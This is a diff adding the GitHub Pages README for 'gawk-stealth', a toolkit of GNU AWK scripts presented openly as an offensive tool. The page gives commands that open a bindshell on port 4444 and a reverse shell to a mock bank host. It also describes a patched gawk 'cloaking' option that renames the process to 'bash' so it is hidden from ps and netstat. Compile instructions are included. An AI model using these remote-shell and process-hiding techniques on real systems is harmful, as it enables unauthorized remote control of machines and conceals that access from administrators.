@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+    <meta charset='utf-8' />
+    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
+    <meta name="description" content="gawk-stealth : Gawk Stealth Tools" />
+
+    <link rel="stylesheet" type="text/css" media="screen" href="stylesheets/stylesheet.css">
+
+    <title>gawk-stealth</title>
+  </head>
+
+  <body>
+
+    <!-- HEADER -->
+    <div id="header_wrap" class="outer">
+        <header class="inner">
+          <a id="forkme_banner" href="https://github.com/gitbrew/gawk-stealth">Fork Me on GitHub</a>
+
+          <h1 id="project_title">gawk-stealth</h1>
+          <h2 id="project_tagline">Gawk Stealth Tools</h2>
+
+          <section id="downloads">
+            <a class="zip_download_link" href="https://github.com/gitbrew/gawk-stealth/zipball/master">Download this project as a .zip file</a>
+            <a class="tar_download_link" href="https://github.com/gitbrew/gawk-stealth/tarball/master">Download this project as a tar.gz file</a>
+          </section>
+        </header>
+    </div>
+
+    <!-- MAIN CONTENT -->
+    <div id="main_content_wrap" class="outer">
+      <section id="main_content" class="inner">
+        <h1><a href="http://gitbrew.org/gawk">gawk-stealth</a></h1>
+
+<h2>Copyright (C) 2012 Iadnah <a href="mailto:iadnah@gitbrew.org"></a><a href="mailto:iadnah@gitbrew.org">iadnah@gitbrew.org</a>
+</h2>
+
+<h2>gawk-stealth is distributed under the GNU GPL</h2>
+
+<h3>SYNOPSIS</h3>
+
+<p>Gawk-Stealth consists of two parts: a set of scripts that can be run from within GNU AWK (using the -f option), and a statically linked 32-bit version of GNU AWK that is patched with our Romulan Cloaking technology.  </p>
+
+<h3>COMPILATION</h3>
+
+<p>To compile, untar the version of gawk in static_gawk, apply the gawk-3.1.8_gawkhide.patch, and compile using the makestatic script.  </p>
+
+<h3>SAMPLE USES</h3>
+
+<p>The main script of interest is rgawkcmd-0.2.gawk.  When using it, the most important thing to keep in mind is that options are set using environmental variables.  In bash, you may set these with the export command, or to make more persistent you can add the env vars to .bashrc in the home directory.  </p>
+
+<p>To make a listening bindshell with rgawkcmd-0.2.gawk, issue the following commands:  </p>
+
+<pre><code>$ export RGC_LPORT=4444
+$ export RGC_MODE="listen"
+$ gawk -f rgawkcmd-0.2.gawk
+</code></pre>
+
+<p>This will open up a listening bindshell on port 4444.  To do a reverse bindshell, you would enter:  </p>
+
+<pre><code>$ export RGC_MODE="remote"
+$ export RGC_RPORT=4444
+$ export RGC_HOST="totallylegitimate.nationalbankofuganda.com"
+$ gawk -f rgawkcmd-0.2.gawk
+</code></pre>
+
+<h3>ROMULAN CLOAKING TECHNOLOGY</h3>
+
+<p>In order to turn on Romulan Cloaking Device (reverse engineered by CDR Data from a Romulan Warbird captured by CPT Jean-Luc Picard), set GAWK_HIDE to anything but NULL.  Example:  </p>
+
+<pre><code>$ export GAWK_HIDE=1
+</code></pre>
+
+<p>This changes argv[0] to read "bash" (for ps and netstat purposes).<br>
+NOTE: this requires you use patched version of GNU AWK included with this package.  </p>
+
+<h2>LICENSE</h2>
+
+<p>gawk-stealth Copyright (C) 2012 Iadnah iadnah@gitbrew.org</p>
+
+<p>This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any later version.</p>
+
+<p>This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.</p>
+
+<p>You should have received a copy of the GNU General Public License along with this program; if not, write to the Free Software Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA</p>
+
+<p>See the COPYING file for more information.</p>
+
+<hr><p>Iadnah <a href="mailto:iadnah@gitbrew.org"></a><a href="mailto:iadnah@gitbrew.org">iadnah@gitbrew.org</a><br>
+Security Consultant<br><a href="http://gitbrew.org">gitbrew.org</a><br><a href="http://hephaestussec.com">Hephaestus Security</a></p>
+      </section>
+    </div>
+
+    <!-- FOOTER  -->
+    <div id="footer_wrap" class="outer">
+      <footer class="inner">
+        <p class="copyright">gawk-stealth maintained by <a href="https://github.com/gitbrew">gitbrew</a></p>
+        <p>Published with <a href="http://pages.github.com">GitHub Pages</a></p>
+      </footer>
+    </div>
+
+    
+
+  </body>
+</html>
